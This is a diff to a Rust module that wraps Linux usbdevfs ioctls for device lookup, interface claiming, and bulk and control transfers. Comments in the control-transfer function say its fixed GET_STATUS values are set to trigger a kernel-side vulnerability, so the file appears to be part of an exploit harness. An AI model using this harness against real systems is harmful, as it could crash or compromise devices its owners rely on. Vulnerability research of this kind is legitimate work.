@@ -1,5 +1,9 @@
-use std::ffi::{c_ulong, c_void};
 use std::mem::size_of;
+
+use regex::Regex;
+use std::os::fd::AsRawFd;
+use std::{fs, fs::OpenOptions, path::PathBuf};
+use walkdir::WalkDir;
 
 // USB Control Transfer Request definition
 // include/uapi/linux/usbdevice_fs.h:40
@@ -11,7 +15,7 @@ struct USBControlTransfer {
     index: u16,
     length: u16,
     timeout: u32,
-    data: *mut c_void,
+    data: *mut libc::c_void,
 }
 
 // USB Bulk Transfer Request definition
@@ -21,10 +25,13 @@ struct USBBulkTransfer {
     ep: u32,
     len: u32,
     timeout: u32,
-    data: *mut c_void,
+    data: *mut libc::c_void,
 }
 
-struct USBDevice {}
+#[repr(C)]
+struct USBClaimInterface {
+    interface: u32,
+}
 
 // IOCTL Operation number
 // Defined as a recursive macro in the kernel
@@ -43,37 +50,149 @@ struct USBDevice {}
 // 	 ((size) << _IOC_SIZESHIFT))
 
 #[inline(always)]
-const fn iocwr_usbdev(request_size: u32, request_number: u32) -> u32 {
+const fn ioc_usbdev(request_size: u32, request_number: u32, direction: u32) -> u32 {
     const USBDEV_REQ_TYPE: u32 = b'U' as u32; // USB ioctl identifier
-    const IOC_WRITE: u32 = 0x01;
-    const IOC_READ: u32 = 0x02;
-    const DIRECTION: u32 = IOC_READ | IOC_WRITE;
-    (DIRECTION << 30/*DIRSHIFT*/)
+    (direction << 30/*DIRSHIFT*/)
         | (request_size << 16/*TYPESHIFT*/)
         | (USBDEV_REQ_TYPE << 8/*NRSHIFT*/)
         | request_number /*SIZESHIFT*/
 }
 
-const IOCTL_USB_CTRL: u32 = iocwr_usbdev(size_of::<USBControlTransfer>() as u32, 0);
-const IOCTL_USB_BULK: u32 = iocwr_usbdev(size_of::<USBBulkTransfer>() as u32, 2);
+// ioctl operation numbers
+const IOC_WRITE: u32 = 0x01;
+const IOC_READ: u32 = 0x02;
+const IOCTL_USB_CTRL: u32 = ioc_usbdev(
+    size_of::<USBControlTransfer>() as u32,
+    0,
+    IOC_READ | IOC_WRITE,
+);
+const IOCTL_USB_BULK: u32 =
+    ioc_usbdev(size_of::<USBBulkTransfer>() as u32, 2, IOC_READ | IOC_WRITE);
+const IOCTL_USB_CLAIM_INTERFACE: u32 =
+    ioc_usbdev(size_of::<USBClaimInterface>() as u32, 15, IOC_READ);
+
+trait IoctlRequest {
+    const IOCTL: libc::c_ulong;
+}
+impl IoctlRequest for USBControlTransfer {
+    const IOCTL: libc::c_ulong = IOCTL_USB_CTRL as libc::c_ulong;
+}
+impl IoctlRequest for USBBulkTransfer {
+    const IOCTL: libc::c_ulong = IOCTL_USB_BULK as libc::c_ulong;
+}
+impl IoctlRequest for USBClaimInterface {
+    const IOCTL: libc::c_ulong = IOCTL_USB_CLAIM_INTERFACE as libc::c_ulong;
+}
+
+// Read hexadecimal format integer from a file
+fn read_hex_from_file(path: &PathBuf) -> Option<u16> {
+    let content = fs::read_to_string(path).ok()?;
+    u16::from_str_radix(content.trim(), 16).ok()
+}
+
+// Read decimal format integer from a file
+fn read_dec_from_file(path: &PathBuf) -> Option<u16> {
+    let content = fs::read_to_string(path).ok()?;
+    u16::from_str_radix(content.trim(), 10).ok()
+}
+
+#[derive(Debug)]
+pub struct USBDevice {
+    device_file: fs::File,
+}
 
 impl USBDevice {
-    fn write(/*fd: i32*/) {
-        // Dummy workflow
-        // let endpoint: u32 = 0x1;
-        // let mut data: u32 = 0xDEADBEEF;
-        // let mut bulk_request = USBBulkTransfer {
-        //     ep: endpoint,
-        //     len: size_of::<u32>() as u32,
-        //     timeout: 0,
-        //     data: (&mut data as *mut u32).cast::<c_void>(),
-        // };
-        // unsafe {
-        //     libc::ioctl(
-        //         fd,
-        //         IOCTL_USB_BULK as c_ulong,
-        //         &mut bulk_request as *mut USBBulkTransfer,
-        //     )
-        // };
+    // Find the device Bus number and Device number through Linux sysfs
+    pub fn find_device(device_vid: u16, device_pid: u16) -> Option<USBDevice> {
+        // Iterate over all devices using the xhci_hcd interface
+        let devices_re = Regex::new(r"/.*(\d{4}:\d{2}:\w{2}.\d)/usb\d/\d+-\d+$").unwrap();
+        for entry in WalkDir::new("/sys/bus/pci/drivers/xhci_hcd/")
+            .max_depth(3)
+            .follow_links(true)
+            .into_iter()
+            .filter_map(walkdir::Result::ok)
+            .filter(|entry| devices_re.is_match(&entry.path().to_string_lossy()))
+        {
+            // look on the idVendor and idProduct files
+            let path = entry.path();
+            let Some(vid) = read_hex_from_file(&path.join("idVendor")) else {
+                continue;
+            };
+            let Some(pid) = read_hex_from_file(&path.join("idProduct")) else {
+                continue;
+            };
+
+            // If ids match, then we found our device
+            if vid == device_vid && pid == device_pid {
+                let Some(busnum) = read_dec_from_file(&path.join("busnum")) else {
+                    continue;
+                };
+                let Some(devnum) = read_dec_from_file(&path.join("devnum")) else {
+                    continue;
+                };
+                let device_node =
+                    std::path::PathBuf::from(format!("/dev/bus/usb/{busnum:03}/{devnum:03}"));
+
+                if let Ok(device_file) =
+                    OpenOptions::new().read(true).write(true).open(&device_node)
+                {
+                    return Some(Self { device_file });
+                }
+            }
+        }
+        None
+    }
+
+    // Claim interface
+    pub fn claim_interface(&self, interface: u32) -> std::io::Result<()> {
+        let mut claim_if_request = USBClaimInterface { interface };
+        self.write(&mut claim_if_request)
+    }
+
+    // Send a URB request through ioctl
+    fn write<T: IoctlRequest>(&self, request: &mut T) -> std::io::Result<()> {
+        unsafe {
+            let device_fd = self.device_file.as_raw_fd();
+            // Synchronous write call
+            let ret = libc::ioctl(device_fd, T::IOCTL, request as *mut T);
+            if ret < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+        };
+        Ok(())
+    }
+
+    // Send a Bulk request
+    pub fn write_bulk(&self, endpoint: u32, buf: &mut [u8]) -> std::io::Result<()> {
+        let mut bulk_request = USBBulkTransfer {
+            ep: endpoint,
+            len: buf.len() as u32,
+            timeout: 1000,
+            data: (buf.as_mut_ptr() as *mut u32).cast::<libc::c_void>(),
+        };
+        self.write(&mut bulk_request)
+    }
+
+    // Send a Control request
+    pub fn write_control(&self, buf: &mut [u8]) -> std::io::Result<()> {
+        // It is important to note that this is not an usb driver, therefore, we will set some
+        // values in the control request to specific defaults. The idea is to use this to trigger
+        // the vulnerability
+        // The values in the kernel are defined in linux/include/uapi/linux/usb/ch9.h
+        const USB_DIR_IN: u8 = 0x80; // Device should respond with data
+        const USB_RECIP_ENDPOINT: u8 = 0x02;
+        const USB_REQ_GET_STATUS: u8 = 0x0;
+        // The vulnerable code in the switch executes on Get status requests where the recipient is
+        // an endpoint
+        let mut control_request = USBControlTransfer {
+            req_type: USB_DIR_IN | USB_RECIP_ENDPOINT, // Direction | Type | Recipient
+            req: USB_REQ_GET_STATUS,                   // GET request code
+            value: 0,
+            index: 0,
+            length: buf.len() as u16,
+            timeout: 1000,
+            data: (buf.as_mut_ptr() as *mut u32).cast::<libc::c_void>(),
+        };
+        self.write(&mut control_request)
     }
 }
